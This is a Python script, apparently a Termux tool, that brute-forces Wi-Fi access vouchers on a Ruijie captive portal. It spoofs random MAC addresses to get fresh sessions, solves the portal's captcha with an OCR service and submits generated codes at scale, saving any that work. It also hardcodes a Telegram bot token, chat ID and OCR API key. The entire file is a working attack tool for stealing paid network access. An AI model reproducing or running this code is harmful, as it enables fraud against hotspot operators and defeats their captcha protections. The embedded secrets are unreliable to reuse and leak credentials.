import sys
import asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from datetime import datetime, timedelta, timezone
from aiohttp import web
import requests          # for Telegram API
import getpass           # for device ID
import subprocess        # for whoami
from io import BytesIO
from PIL import Image

# ── Configuration ────────────────────────────────────────────────────────
ADMIN_ID = "8475105021"
AUTH_FILE = "auth_list.json"

# ── Telegram License Config ──
TELEGRAM_BOT_TOKEN = "8685868556:AAFjPmgOehi-5H9_cDZd1d_huLd6M9m1vFA"
TELEGRAM_CHAT_ID = "7774402865"
LICENSE_FILE = ".voucher_license"
DEVICE_ID_FILE = ".voucher_device_id"

# ── Global structures ──────────────────────────────────────────────────
user_data = {}
scan_running = False
stop_scan = False
success_texts = []
limited_texts = []
notify_setting = {}
session = None
_connector = None
_start_time = time.monotonic()
CONCURRENCY = 500
BATCH_SIZE = 2000
_voucher_sem = None
scan_task = None
current_mode = None
current_target = None
current_plan_filters = []

# ── WEB SERVER ──────────────────────────────────────────────────────────
async def web_server():
    app = web.Application()
    app.router.add_get('/', lambda request: web.Response(text="Voucher Scanner is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"✅ Web server running on port {port}")

# ── Helper functions ────────────────────────────────────────────────────
PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if length <= 7:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
        else:
            while True:
                yield ''.join(random.choices(string.digits, k=length))
        return
    if mode == "starlink":
        while True:
            part1 = ''.join(random.choices(string.ascii_uppercase, k=3))
            part2 = ''.join(random.choices(string.digits, k=3))
            part3 = ''.join(random.choices(string.digits, k=3))
            yield f"{part1}-{part2}-{part3}"
        return
    if mode == "starlink2":
        while True:
            part1 = ''.join(random.choices(string.digits, k=3))
            part2 = ''.join(random.choices(string.digits, k=3))
            part3 = ''.join(random.choices(string.digits, k=3))
            yield f"{part1}-{part2}-{part3}"
        return
    if mode == "ascii-lower":
        while True:
            yield ''.join(random.choices(string.ascii_lowercase, k=6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield ''.join(random.choices(chars, k=6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def print_progress(checked, total=None, speed=0, found=0, target=None, mode=None):
    if mode in ["starlink", "starlink2"]:
        mode_label = f"STARLINK-{mode.upper()}"
    else:
        mode_label = f"Mode-{mode}"
    
    if total:
        progress = (checked / total * 100) if total > 0 else 0
        bar = f"[{'█' * int(progress//2)}{'░' * (50 - int(progress//2))}]"
        status = f"{mode_label} {bar} {progress:.1f}%"
    else:
        status = f"{mode_label} | Checked: {checked:,}"
    
    status += f" | Found: {found}"
    if target:
        status += f"/{target}"
    status += f" | Speed: {speed:,.0f}/min"
    
    print(f"\r{' ' * 120}", end="")
    print(f"\r{status}", end="", flush=True)

# ── Captcha handling (Modified: Removed ddddocr/cv2) ──────────────────
async def Captcha_Text(image_bytes):
    """
    Solve captcha using OCR.space API (Free).
    Note: Requires an internet connection and an API key.
    For local use on Termux, this is much lighter than cv2/ddddocr.
    """
    try:
        # Simple preprocessing with Pillow if needed
        img = Image.open(BytesIO(image_bytes))
        img = img.convert('L') # Grayscale
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        
        # Using OCR.space Free API
        # You can get your own key at https://ocr.space/ocrapi
        api_key = 'K81684333688957' # This is a public demo key, better to use a private one
        payload = {
            'apikey': api_key,
            'language': 'eng',
            'isOverlayRequired': False,
            'base64Image': f"data:image/png;base64,{base64.b64encode(buffered.getvalue()).decode()}",
            'OCREngine': 2 # Engine 2 is better for captchas
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post('https://api.ocr.space/parse/image', data=payload) as resp:
                result = await resp.json()
                if result.get('ParsedResults'):
                    text = result['ParsedResults'][0].get('ParsedText', '').strip()
                    # Clean up the text (remove spaces, special chars)
                    text = re.sub(r'[^A-Za-z0-9]', '', text)
                    return text.upper()
    except Exception as e:
        # print(f"OCR Error: {e}")
        pass
    return None

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0: return "0m"
    if total_mins < 60: return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24: return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30: return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(session_id):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"
    headers = {
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            data = await resp.json()
            # Simplified logic to get balance
            for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'balance']:
                if key in data: return _parse_minutes(data[key])
            if 'result' in data:
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'balance']:
                    if key in data['result']: return _parse_minutes(data['result'][key])
            return "N/A"
    except:
        return "N/A"

async def perform_check(session_url, code, plan_filters=None):
    global stop_scan
    if stop_scan: return None

    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    for attempt in range(3):
        if stop_scan: return None
        async with aiohttp.ClientSession() as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id: continue
            
            auth_code = None
            for _ in range(5): # Reduced attempts for speed
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text: continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except: continue
            
            if not auth_code: continue
            
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            async with task_session.post(post_url, json=data) as resp:
                res_data = await resp.json()
                if res_data.get("success"):
                    balance = await get_balance(session_id)
                    return {"code": code, "plan": balance}
    return None

async def run_bruteforce(mode, session_url, target=None, plan_filters=None):
    global scan_running, stop_scan, success_texts
    checked = 0
    found = 0
    start_time = time.monotonic()
    
    print(f"\n🚀 Scanning started... Mode: {mode}")
    
    async with aiohttp.ClientSession() as session_obj:
        for code in iter_codes(mode):
            if stop_scan: break
            
            result = await perform_check(session_url, code, plan_filters)
            checked += 1
            
            if result:
                found += 1
                success_texts.append(result)
                with open("found_codes.txt", "a") as f:
                    f.write(f"{result['code']} | Plan: {result['plan']}\n")
                print(f"\n✨ FOUND: {result['code']} | Plan: {result['plan']}")
                
                if target and found >= target:
                    print(f"\n🎯 Target reached: {found} codes found.")
                    break
            
            elapsed = time.monotonic() - start_time
            speed = (checked / elapsed) * 60 if elapsed > 0 else 0
            print_progress(checked, speed=speed, found=found, target=target, mode=mode)
            
    scan_running = False
    print("\n✅ Scan finished.")

def show_help():
    print("\n" + "=" * 50)
    print("📜 AVAILABLE COMMANDS")
    print("=" * 50)
    print("  setup <url>        - Set Portal URL")
    print("  brute <mode> [num] - Start scan (modes: 6, 7, 8, 9, starlink)")
    print("  stop               - Stop current scan")
    print("  saved              - Show saved codes")
    print("  status             - Show bot status")
    print("  exit               - Exit program")
    print("=" * 50)

async def main():
    global scan_running, stop_scan
    print("\n🤖 Voucher Scanner for Termux (Lightweight)")
    print("📌 Type 'help' for commands")
    
    while True:
        try:
            cmd = await asyncio.to_thread(input, "\n> ")
            cmd = cmd.strip().lower()
            if not cmd: continue
            
            parts = cmd.split()
            command = parts[0]
            
            if command in ["exit", "quit"]:
                stop_scan = True
                break
            elif command == "help":
                show_help()
            elif command == "setup":
                if len(parts) < 2: print("Usage: setup <url>")
                else:
                    if await check_session_url(parts[1]):
                        user_data["session_url"] = parts[1]
                        print("✅ Setup complete")
                    else: print("❌ Invalid URL")
            elif command == "brute":
                if len(parts) < 2: print("Usage: brute <mode>")
                else:
                    mode = parts[1]
                    target = int(parts[2]) if len(parts) > 2 else None
                    if "session_url" not in user_data:
                        print("❌ Run 'setup <url>' first")
                        continue
                    scan_running = True
                    stop_scan = False
                    await run_bruteforce(mode, user_data["session_url"], target)
            elif command == "stop":
                stop_scan = True
                print("⏹️ Stopping...")
            elif command == "saved":
                for i, res in enumerate(success_texts, 1):
                    print(f"{i}. {res['code']} | {res['plan']}")
            elif command == "status":
                print(f"Running: {scan_running}, Found: {len(success_texts)}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
